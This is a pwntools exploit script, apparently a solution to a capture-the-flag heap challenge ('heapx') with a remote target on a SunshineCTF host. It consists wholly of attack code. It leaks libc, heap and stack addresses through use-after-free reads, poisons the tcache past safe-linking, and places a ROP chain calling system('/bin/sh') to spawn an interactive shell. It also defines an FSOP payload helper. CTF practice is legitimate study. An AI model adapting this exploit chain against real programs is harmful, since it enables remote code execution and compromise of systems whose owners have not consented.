#!/usr/bin/env python3

from pwn import *

exe = ELF('heapx_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())
mangle = lambda val, adrs: \
	(adrs >> 12) ^ val

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x12FA
        brva 0x1660
        brva 0x1570
        brva 0x190F
        c
        ''')
        input()


if args.REMOTE:
    p = remote('chal.sunshinectf.games', 25004)
else:
    p = process([exe.path])

def add(size):
    sla(p, b'> ', f'new {size}')
def read(id):
    sla(p, b'> ', f'read {id}')
def write(id, size, data):
    sla(p, b'> ', b'write ' + b'%d' % id + b' ' + b'%d' % size)
    sa(p, b'data: ', data)
def delete(id):
    sla(p, b'> ', f'delete {id}')

def fsrop(fp=libc.sym._IO_2_1_stdout_, offset=-0x20):
  fs = FileStructure()   
  fs.flags = u64(b' sh\0\0\0\0\0')                    
  fs._lock = libc.sym._IO_stdfile_1_lock 
  fs._wide_data = fp - 0x10
  fs.unknown2 = p64(0)*4 + p64(libc.sym.system) + p64(fp + 0x60)  
  fs.vtable = libc.sym._IO_wfile_jumps + offset
  return bytes(fs) 


sla(p, b'> ', b'help')
add(0x450)
add(0x300)
add(0x300)
add(0x20)
delete(0)
delete(1)
delete(2)
read(0)
leak_libc = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak_libc - 0x210b20
info('LIBC BASE: ' + hex(libc.address))
read(1)
heap = (u64(p.recv(5).ljust(8, b'\x00')) << 12) - 0x1000
info('HEAP BASE: ' + hex(heap))
write(2, 0, p64(mangle((libc.sym.environ - 0x18), (heap + 0x1a20))))
add(0x300)
add(0x300)

write(5, 0, b'a'*(0x18+1))
read(5)
p.recvuntil(b'a'*0x18)
leak_stack = u64(p.recv(6).ljust(8, b'\x00'))
ret_new = leak_stack - 0x130
pop_rdi = libc.address + 0x119e9c
binsh = next(libc.search(b"/bin/sh\x00"))
info('LEAK STACK: ' + hex(leak_stack))
info('RET2ADDR: ' + hex(ret_new))
add(0x200)
add(0x200)
delete(6)
delete(7)
write(7, 0, p64(mangle((ret_new - 0x8), (heap + 0x14c0))))
add(0x200)
add(0x200)
write(9, 0, b'a'*(0x28+1))
read(9)
p.recvuntil(b'a'*0x28)
exe.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x167b
info('EXE BASE: ' + hex(exe.address))
write(9, 0, p64(0) + p64(pop_rdi) + p64(binsh) + p64(pop_rdi+1) + p64(libc.sym.system) + b'a')
add(0x200)
delete(10)
delete(7)
write(7, 0, p64(mangle((exe.address + 0x4060 - 0x20), (heap + 0x14c0))))
add(0x200)
# GDB()
add(0x200)
write(12, 0, p64(0)*30)
sla(p, b'> ', b'exit')
p.interactive()